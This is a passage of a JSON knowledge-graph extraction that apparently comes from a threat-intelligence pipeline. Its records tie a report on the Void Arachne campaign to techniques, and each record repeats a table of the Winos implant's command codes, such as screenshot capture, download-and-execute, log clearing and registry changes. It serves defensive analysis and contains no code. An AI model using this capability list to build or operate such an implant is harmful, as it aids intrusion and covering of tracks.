          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--screenshot-capture",
      "confidence": 0.95,
      "evidence": "报告中提到了截屏的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--file-execution",
      "confidence": 0.95,
      "evidence": "报告中提到了执行文件的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--file-download",
      "confidence": 0.95,
      "evidence": "报告中提到了从URL下载文件的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--process-enumeration",
      "confidence": 0.95,
      "evidence": "报告中提到了枚举系统进程的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--log-clearing",
      "confidence": 0.95,
      "evidence": "报告中提到了清除系统日志的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--system-restart",
      "confidence": 0.95,
      "evidence": "报告中提到了重启系统的命令",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--system-shutdown",
      "confidence": 0.95,
      "evidence": "报告中提到了关闭系统的命令",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--plugin-method-change",
      "confidence": 0.95,
      "evidence": "报告中提到了更改默认插件加载方法的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--configuration-update",
      "confidence": 0.95,
      "evidence": "报告中提到了更新配置设置的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--c2-thread-creation",
      "confidence": 0.95,
      "evidence": "报告中提到了创建新的C&C线程并收集系统信息的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--registry-value-setting",
      "confidence": 0.95,
      "evidence": "报告中提到了设置特定注册表值的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--registry-value-removal",
      "confidence": 0.95,
      "evidence": "报告中提到了移除特定注册表值的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    }
  ],
  "statistics": {
    "total_entities": 182,
    "total_relationships": 147,
    "chunks_processed": 25
  }
}